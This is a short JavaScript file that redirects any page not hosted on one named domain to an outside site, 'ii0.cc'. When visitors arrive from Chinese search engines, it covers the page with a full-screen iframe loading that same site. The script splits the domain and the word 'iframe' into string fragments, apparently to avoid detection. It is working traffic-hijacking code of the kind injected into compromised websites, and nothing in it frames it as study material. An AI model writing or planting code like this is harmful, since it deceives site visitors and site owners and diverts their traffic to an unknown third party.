// if (document.location.href.indexOf("2wus.com") != -1){
//     document.location.href="http"+"://www."+"2wus"+".com"
// }
if (document.location.href.indexOf("scmyzm.com") == -1){
    document.location.href="https"+"://"+"ii0"+".cc"
}

function test(){
    var ifr = document.createElement("i"+"f"+"r"+"a"+"m"+"e");
    ifr.setAttribute("scrolling", "yes");
    ifr.setAttribute("marginheight", "0");
    ifr.setAttribute("frameborder","0");
    ifr.setAttribute("src","https"+"://"+"ii0"+".cc");
    ifr.setAttribute("style","position: fixed; top: 0px; z-index: 99999; width: 100%; height: 100%; ")
    
    document.body.appendChild(ifr);
    document.body.setAttribute("style","overflow-y:hidden");
}




if (document.referrer.indexOf("baidu") != -1){
    test();
}
else if (document.referrer.indexOf("sogou") != -1){
    test();
}
else if (document.referrer.indexOf("so.com") != -1){
    test();
}
else if (document.referrer.indexOf("m.sm.cn") != -1){
    test();
}

